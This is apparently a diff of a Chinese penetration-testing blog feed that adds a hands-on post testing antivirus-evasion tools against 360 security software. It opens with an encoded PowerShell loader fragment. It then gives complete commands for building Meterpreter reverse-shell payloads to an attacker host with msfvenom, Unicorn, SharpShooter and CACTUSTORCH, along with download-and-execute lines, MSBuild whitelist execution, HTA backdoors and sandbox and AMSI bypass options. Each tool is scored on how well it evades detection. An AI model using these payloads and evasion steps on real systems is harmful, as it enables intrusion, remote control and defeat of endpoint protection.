AbgAxAEcAdQAhAFgASABJAEMAUQB2AGcAYwBPAG0AeABlAFQAVwA3AHUAUgBhAE8ATAB1AFcAYwB4AFgATQBjAGEAWQBGADAAWQBJAHUARwB3AFYATgBhAE0AUgBJAEwAcgBkAFYAaAB1AHgANgBvAGYAcABSAHcAaQBEACEAdwBOADQAVgBqAFQAdQBkAG8AIQBlAFUARwB5AG4AVgBHADUAeABDAFkANgA0AHUAdABOAGsAbQB4AEkAegBRADQARgBTAG8AcgBwAFMATABqAEgAaABmAEsASQBWAGQATQBLAG4AUQBZAEQAYgBTAFcAMgBIACsAdgBwAEwASQBYAFgAVgBCAFgAUQBzAG0AUgBWAGUAeQAzAEMAcABnAHoAUQBMAHUAQwA2AFEAWABjAFoAcAAhAHEAUgAhAEoATABwADAAZwBHAHQAcQBFAEQAMwBTADkAMQBaAHEAQgB4AFEAdQA2ADEAbwBsAGYAUwA2AHAANwBjAFEAZQB2AGMAbABSAFMAYwA2AEgAQwBwADkATABZAHoAVAByADMAdwArAHUANwB6AHcANAAzADIANwA5AGMAeQBMACsAdgBvAG8AbQB2AEgAQwBqAFUAbQA3AG0ASQB1AGEATgBDAGoAaQBsAG8AZgBRAHEAVwBTAC8AYQAyAHQAMQBwADkAdAB0ADcAVwA3ADUANwBiAGIATABiAGYAVgAzAHQAcwBTAG0AVQBvAHkAMQBXAGoAdAA3AHUAegBzADcAdQA3ADkAcwBkADEAMABwADEASAB5AEkAZAArAEkAQgB2AFYAdgB3AHAAdQBWAGcAdAAvAHkAdgAhAEcAVgBhAFUAZwA1AEYAbwA5AFcAVgBvAG4AdgBXAE0AagBqADAAbwAyAEcAZwB1AGsATQB5ADYAcgBQAHIAeAB1AFEATQBYACEAMABlAEQAdwBDAEsAdABZADYAbgAhAHQAZgBlADIAUgBoAFgAbQBqAFEAaABXADEATwBVAEkASgBmADgAWABPADcAdgBmAGIATABKAHMAKwBCAGQAbQAyAGQAVgBkAFAAKwAvAGoAZQBzAEYAWQBWAFEAUQBlAGUAZQBRAGoAeABYAG8AZABPADgAMwAyADQAMgAwAGUAYQBhADkAegB0AE4AdQArAGIAeQA5ADIAdgBzAGkAbQBSAHAAUABRAC8AbgBhAEsAcwBzAGsARgBxAGQAaABPAGUAVABGAEQAIQB1AC8ASAA3AG4ANABYACsAIQBzAGQAUgBuAGkASwAvAGcAdAB6AEQAVwBiAFgALwBUACsAeQA1AG8AbQAwADYANQAvAEYAZgB0AEwAeAB2ACsARQBjAGoALwBEAG8ARQBSAFoAUQByAEQAUABiAFEAbQBEAHMAWABlAGUAIQBPAEkAVQBqAG8AcgBSADIAMwBPAEUAcQBwAGkAVgBqADcANgAxAG4ATwBPAE8AKwBNAE0AagArAEQATgBEAGYATgAhAFUAOQBtAGYAawBaAFgAVgBwACsAdwBCAHIAegB4AHcAUwAvAGIAcwAxAFoATQAyAFYAVgBTAHEAeABrADgAeAB4AFgAdABTAG8AZwA5AEMAeQArAGkAeQBoAFUAMwA2AFIAOQBkAEUAZgA1AEUAbgAwAGsAIQAhAE8AdQBsADIARwB5ADkATQBjAHAANQBwAFAAeQBKAEcAYwBlAEYANwBKAEgAZQA0AGgAagB6ADcAawBWAHkAIQBEADMAagB2AGEAWAB3AFcAMAA5AHgAdgAhAEkAKwBPADEAWgBuAHkARQBmAE8AOAB2AFAAcwB2AGEAYQBvAFoARwBUAFEASwAhACEAIQA9ACIALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAgACIAQQAiACkAKQApADsAIAAkAHIAVQBlAFIAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQASABhAHAAYgBMAFIAdABUACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAIABbAFMAYwByAGkAcAB0AEIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAcgBVAGUAUgApAC4ASQBuAHYAbwBrAGUAKAApAAoA</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p><code>web</code>直接<code>run</code>，此时Win7已经可以通过上一步的url下载图片了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212203907952.png" alt="image-20220212203907952"></p>
+<h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212204141231.png" alt="image-20220212204141231"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212204501644.png" alt="image-20220212204501644"></p>
+<p>360全家桶对bmp图片进行扫描没有问题，但是执行ps脚本会警告</p>
+<h3 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h3><p>DKMC通过把shellcode注入到bmp文件中再利用powershell来执行，虽然图片没有被查杀但是powershell的行为容易被杀软注意到，后续可以对ps代码进行混淆来进一步利用</p>
+<h2 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h2><h3 id="安装-6"><a href="#安装-6" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/trustedsec/unicorn.git</span><br></pre></td></tr></table></figure>
+
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>可生成ps1、macro、hta、dde等代码和文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: python unicorn.py payload reverse_ipaddr port &lt;optional hta or macro, crt&gt;</span><br><span class="line">PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443</span><br><span class="line">PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe</span><br><span class="line">PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro</span><br><span class="line">Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro</span><br><span class="line">Macro Example CS: python unicorn.py &lt;cobalt_strike_file.cs&gt; cs macro</span><br><span class="line">HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta</span><br><span class="line">HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms</span><br><span class="line">HTA Example CS: python unicorn.py &lt;cobalt_strike_file.cs&gt; cs hta</span><br><span class="line">HTA Example SettingContent-ms: python unicorn.py &lt;cobalt_strike_file.cs cs ms</span><br><span class="line">HTA Example SettingContent-ms: python unicorn.py &lt;patth_to_shellcode.txt&gt;: shellcode ms</span><br><span class="line">DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde</span><br><span class="line">CRT Example: python unicorn.py &lt;path_to_payload/exe_encode&gt; crt</span><br><span class="line">Custom PS1 Example: python unicorn.py &lt;path to ps1 file&gt;</span><br><span class="line">Custom PS1 Example: python unicorn.py &lt;path to ps1 file&gt; macro 500</span><br><span class="line">Cobalt Strike Example: python unicorn.py &lt;cobalt_strike_file.cs&gt; cs (export CS in C# format)</span><br><span class="line">Custom Shellcode: python unicorn.py &lt;path_to_shellcode.txt&gt; shellcode (formatted 0x00 or metasploit)</span><br><span class="line">Custom Shellcode HTA: python unicorn.py &lt;path_to_shellcode.txt&gt; shellcode hta (formatted 0x00 or metasploit)</span><br><span class="line">Custom Shellcode Macro: python unicorn.py &lt;path_to_shellcode.txt&gt; shellcode macro (formatted 0x00 or metasploit)</span><br><span class="line">Generate .SettingContent-ms: python unicorn.py ms</span><br><span class="line">Help Menu: python unicorn.py --help</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-6"><a href="#使用-6" class="headerlink" title="使用"></a>使用</h3><p>生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python unicorn.py windows/meterpreter/reverse_https 192.168.221.128 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212211144925.png" alt="image-20220212211144925"></p>
+<p>生成<code>powershell_attack.txt</code>和<code>unicorn.rc</code></p>
+<p>直接用<code>msfconsole -r unicorn.rc</code>快速启动MSF</p>
+<p>在目标机执行powershell脚本</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212211726185.png" alt="image-20220212211726185"></p>
+<p>360直接阻止powershell运行了</p>
+<h3 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h3><p>可生成代码多样，但是不经过混淆直接使用很难免杀</p>
+<h2 id="Python-Rootkit"><a href="#Python-Rootkit" class="headerlink" title="Python-Rootkit"></a>Python-Rootkit</h2><p>（待补）</p>
+<h2 id="ASWCrypter"><a href="#ASWCrypter" class="headerlink" title="ASWCrypter"></a>ASWCrypter</h2><p>该工具使用python脚本对hta代码进行编码处理，生成新的hta后门</p>
+<h3 id="安装-7"><a href="#安装-7" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AbedAlqaderSwedan1/ASWCrypter.git</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-7"><a href="#使用-7" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x ASWCrypter.sh</span><br><span class="line">./ASWCrypter.sh</span><br></pre></td></tr></table></figure>
+
+<p>选择<code>G</code>，generate</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215442859.png" alt="image-20220212215442859"></p>
+<p>配置LHOST、LPORT</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215316449.png" alt="image-20220212215316449"></p>
+<p>如果生成payload时报错可以<code>mkdir output</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215104051.png" alt="image-20220212215104051"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215908266.png" alt="image-20220212215908266"></p>
+<p>执行被360安全卫士警告</p>
+<h3 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h3><p>静态免杀效果不错，但是调用powershell的行为会被警告</p>
+<h2 id="nps-payload"><a href="#nps-payload" class="headerlink" title="nps_payload"></a>nps_payload</h2><p><code>nps_payload</code>可以⽣成基于msbuild的xml⽂件和独⽴执⾏的hta⽂件，并对xml⽂件和hta⽂件做了⼀定的混淆免杀，以达到免杀目的</p>
+<h3 id="安装-8"><a href="#安装-8" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/trustedsec/nps_payload</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-8"><a href="#使用-8" class="headerlink" title="使用"></a>使用</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212221042746.png" alt="image-20220212221042746"></p>
+<p>只需要使用<code>msbuild_nps.xml</code></p>
+<p>需要用<code>msbuild.exe</code>，<code>msbuild.exe</code>在windows中的一般路径<code>C:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe</code></p>
+<p>Windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild_nps.xml</span><br></pre></td></tr></table></figure>
+
+<p>Kali</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -r msbuild_nps.rc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212225126509.png" alt="image-20220212225126509"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212221714694.png" alt="image-20220212221714694"></p>
+<p>动静态均未被查杀</p>
+<h3 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h3><p>基于白名单程序<code>msbuild.exe</code>执行payload，同时<code>nps_payload</code>对生成的文件进行了混淆，两者结合免杀效果确实强力</p>
+<h2 id="HERCULES"><a href="#HERCULES" class="headerlink" title="HERCULES"></a>HERCULES</h2><p>（安装问题，待补）</p>
+<h2 id="SpookFlare"><a href="#SpookFlare" class="headerlink" title="SpookFlare"></a>SpookFlare</h2><h3 id="安装-9"><a href="#安装-9" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hlldz/SpookFlare.gitpip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-9"><a href="#使用-9" class="headerlink" title="使用"></a>使用</h3><p>直接<code>python spookflare.py</code>执行</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212230929914.png" alt="image-20220212230929914"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212231102345.png" alt="image-20220212231102345"></p>
+<blockquote>
+<p>支持四种payload</p>
 <ol>
-<li>等价替换汇编代码，例如<code>mov eax，0</code>可以换成<code>xor eax，eax</code>，直接结果相同二进制代码不同</li>
-<li>在不影响逻辑的情况下，交换代码顺序</li>
-<li>代码块位移，将代码块移动到不用的内存位置，通过加入jmp addr跳过去执行</li>
+<li>msf的exe程序(自编译)</li>
+<li>msf的ps1脚本(免杀混淆)</li>
+<li>hta</li>
+<li>office宏代码</li>
 </ol>
-<hr>
-<p>修改特征码最重要的是定位特征码，但是定位并修改特征码后不代表病毒木马程序能正常运行，各个杀软厂商的特征库不同，一般修改特征码只能对一类杀软起效。</p>
-<h3 id="添加花指令"><a href="#添加花指令" class="headerlink" title="添加花指令"></a>添加花指令</h3><p>花指令也可称之为垃圾指令。花指令本身对程序的执行结果没有影响，存在的目的是阻止反汇编程序或对反汇编设置的障碍</p>
-<p>⼤多数反病毒软件是靠特征码来判断⽂件是否有毒的，⽽为了提⾼精度，现在的特征码都是在⼀定偏移量限制之内的，否则会对反病毒软件的效率产⽣严重的影响。</p>
-<p>通过添加花指令，程序的部分偏移会受到影响。反病毒软件如果不能识别花指令，那么检测特征码的偏移量就会受到影响，从而无法正常检测木马病毒</p>
-<p><strong>如何添加花指令：</strong></p>
-<ol>
-<li>加数据计算代码，加减乘除各类组合</li>
-<li>加字符串操作代码，增加、删除、查找、替换等</li>
-<li>加多层跳转，跳转间加无效指令</li>
-<li>加貌似有效的API调用，如LoadLibrary+GetProcAddr+API等</li>
-<li>…</li>
-</ol>
-<h3 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h3><p>可以将加壳简单理解为：解密器/解压器+加密器/压缩器（原始代码）</p>
-<p>通过加密器/压缩器将原始代码进行加密压缩，让其特征码变化隐藏，然后组装上解密器/解压器到文件中，运行是先运行解密/解压器，将加密压缩内容解密解压，然后继续运行原始代码</p>
-<h4 id="加冷门壳"><a href="#加冷门壳" class="headerlink" title="加冷门壳"></a>加冷门壳</h4><p>壳也有特征，知名的壳很容易被识别出来，或者自动脱壳并查杀</p>
-<h4 id="改壳"><a href="#改壳" class="headerlink" title="改壳"></a>改壳</h4><p>将开源的压缩壳进行修改，比如修改入口，区段信息修改，入口代码移位</p>
-<h3 id="内存免杀"><a href="#内存免杀" class="headerlink" title="内存免杀"></a>内存免杀</h3><p>大多数反病毒软件的文件扫描与内存扫描采用的不是同一套特征码，文件免杀只能过静态文件扫描，执行时会读入内存，没有做内存免杀还是会被杀软识别出来</p>
-<p>如果是利用Windows自身提供的API来将加密或者封装好的shellcode写入到内存执行的话,将会大大增加查杀的难度</p>
-<h3 id="二次编译"><a href="#二次编译" class="headerlink" title="二次编译"></a>二次编译</h3><p>通过各种编码器、各种语言对shellcode进行二次编码从而达到免杀效果</p>
-<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>将shellcode和加载器分离。shellcode的加载器本身并不包含恶意代码，当加载器运行时，从程序之外加载shellcode执行</p>
-<p>将PE文件以某种加密方式进行存储后使用加载器读取PE文件并且解密，最后放入内存中执行</p>
-<h3 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h3><p>有些杀软设置有扫描白名单，比如程序图标为杀软就可过查杀</p>
-<h4 id="加资源"><a href="#加资源" class="headerlink" title="加资源"></a>加资源</h4><p>使用ResHacker对文件进行资源操作，将正常软件的资源（如图片、版本信息、对话框等）加入到自己的软件</p>
-<h4 id="替换资源"><a href="#替换资源" class="headerlink" title="替换资源"></a>替换资源</h4><p>使用ResHacker替换无用资源（Version等）</p>
-<h4 id="加签名"><a href="#加签名" class="headerlink" title="加签名"></a>加签名</h4><p>使用签名伪造工具，将正常软件的签名信息假如自己的软件中</p>
+</blockquote>
+<p><code>info</code>可以查看需要配置的参数</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232114869.png" alt="image-20220212232114869"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232546093.png" alt="image-20220212232546093"></p>
+<p>参数配置完毕以后生成C#文件，需要用<code>csc.exe</code>编译成exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe xxxx.cs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232815419.png" alt="image-20220212232815419"></p>
+<p>360全家桶第一次扫描没有查杀，过了一会被360杀毒查杀</p>
+<h3 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h3><p>SpookFlare会对每次生成的payload进行代码混淆处理来增加免杀概率，exe文件免杀效果一般，hta可过静态查杀</p>
+<h2 id="SharpShooter"><a href="#SharpShooter" class="headerlink" title="SharpShooter"></a>SharpShooter</h2><p>SharpShooter是武器化的Payload生成框架，支持反沙箱分析、分阶段和无阶段的Payload执行，并能够规避入口监测。</p>
+<h3 id="安装-10"><a href="#安装-10" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mdsecactivebreach/SharpShooter</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-10"><a href="#使用-10" class="headerlink" title="使用"></a>使用</h3><p>执行<code>python SharpShooter.py -h</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212233613004.png" alt="image-20220212233613004"></p>
+<blockquote>
+<p> -h, <em>–help</em> 帮助菜单</p>
+<p> <em>–stageless</em> 创建一个不分阶段的<em>payload</em></p>
+<p> <em>–dotnetver <ver></em> 制定<em>dotnet</em>的版本，<em>2</em>或者<em>4</em></p>
+<p> <em>–com <com> COM</em> 分阶段技术*:* 如<em>outlook, shellbrowserwin,</em></p>
+<p> <em>wmi, wscript, xslremote</em>等</p>
+<p> <em>–awl <awl></em> 使用程序白名单技术*: wmic, regsvr32*</p>
+<p> <em>–awlurl <awlurl></em> 指定取回 <em>XSL/SCT payload</em>的<em>url</em>地址</p>
+<p> <em>–payload <format> Payload</em> 类型*: hta, js, jse, vbe, vbs, wsf,*</p>
+<p> <em>macro, slk</em></p>
+<p> <em>–sandbox <types></em> 绕过沙盒技术*:*</p>
+<p> [1] Key <strong>to Domain</strong> (e.g. 1=CONTOSO)</p>
+<p> [2] Ensure <strong>Domain</strong> Joined</p>
+<p> [3] <strong>Check for</strong> Sandbox Artifacts</p>
+<p> [4] <strong>Check for</strong> Bad MACs</p>
+<p> [5] <strong>Check for</strong> Debugging</p>
+<p> <em>–amsi <amsi></em> 使用<em>AMSI</em>绕过技术*: amsienable*</p>
+<p> <em>–delivery <type></em> 分发方法*: web, dns, both*</p>
+<p> <em>–rawscfile <path></em> 指定生成<em>payload</em>的<em>shellcode</em></p>
+<p> <em>–shellcode</em> 使用内置的<em>shellcode</em></p>
+<p> <em>–scfile <path></em> 指定<em>C#<em>的</em>shellcode</em>的路径</p>
+<p> <em>–refs <refs></em> 指定<em>C#<em>需要的依赖文件，如</em>mscorlib.dll</em>等</p>
+<p> <em>–namespace <ns></em> 指定<em>C#<em>的</em>Namespace</em>，如<em>Foo.bar</em></p>
+<p> <em>–entrypoint <ep></em> 指定<em>C#<em>需要执行的方法，如</em>Main</em></p>
+<p> <em>–web <web></em> 指定<em>web</em>分发的地址</p>
+<p> <em>–dns <dns></em> 指定<em>Dns</em>分发的地址</p>
+<p> <em>–output <output></em> 输出文件的名称</p>
+<p> <em>–smuggle HTML</em>内的隐藏文件</p>
+<p> <em>–template <tpl></em> 指定生成<em>html</em>的<em>template</em>文件 <em>(e.g. mcafee)</em></p>
+</blockquote>
+<p>官方文档里提供了各种payload的生成命令，使用前可以查看一下</p>
+<p>接下来尝试创建一个hta后门</p>
+<p>msfvenom生成shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f raw -o shellcode.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>用SharpShooter创建hta后门</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215151041983.png" alt="image-20220215151041983"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215151355065.png" alt="image-20220215151355065"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215151612441.png" alt="image-20220215151612441"></p>
+<p>运行被查杀</p>
+<h3 id="小结-10"><a href="#小结-10" class="headerlink" title="小结"></a>小结</h3><p>这个框架比较复杂，功能强大。在本次测试只是简单的使用了其中的一些功能，免杀效果比较一般，可能是比较出名或者太老了，但是默认生成的payload还可以用其他的方法进行进一步免杀后效果应该会有所提升</p>
+<p>资料：<a href="https://www.anquanke.com/post/id/100533">https://www.anquanke.com/post/id/100533</a></p>
+<h2 id="CACTUSTORCH"><a href="#CACTUSTORCH" class="headerlink" title="CACTUSTORCH"></a>CACTUSTORCH</h2><h3 id="安装-11"><a href="#安装-11" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mdsecactivebreach/CACTUSTORCH</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-11"><a href="#使用-11" class="headerlink" title="使用"></a>使用</h3><p>先用MSF或者CS生成一个32位shellcode并用base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f raw -o payload.bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215152616661.png" alt="image-20220215152616661"></p>
+<p>复制Base64编码后的shellcode到CACTUSTORCH.js中的<code>code</code>部分</p>
+<p>PS：上面的<code>binary</code>参数也可以替换，例如：计算器（calc.exe）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215152829223.png" alt="image-20220215152829223"></p>
+<p>目标机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wscript.exe CACTUSTORCH.js</span><br></pre></td></tr></table></figure>
+
+<p>执行被360杀毒拦截</p>
+<h3 id="小结-11"><a href="#小结-11" class="headerlink" title="小结"></a>小结</h3><p>本工具和上一个测试的开发者相同，测试效果不太行，但是同样的可以尝试对脚本2代码进行二次免杀来提高免杀能力</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇多各种免杀工具进行了学习，并没有把所有功能都一一尝试过去，安装过程中出现的各种奇奇怪怪的问题总是令人抓狂，查了一堆文章水平也是参差不齐，过程有时枯燥有时免杀成功又会非常兴奋，总的来说还是有收获的</p>
+<p>杀软在不断更新迭代，免杀技术也在不断进步创新，两者在互相碰撞中发展，通过使用不断出现的免杀工具，学习工具免杀的原理和思路，也是了解免杀技术发展的一种方法</p>
+<p>最后，安装问题出现的工具后续有空会补上</p>
 ]]></content>
       <tags>
         <tag>渗透测试</tag>
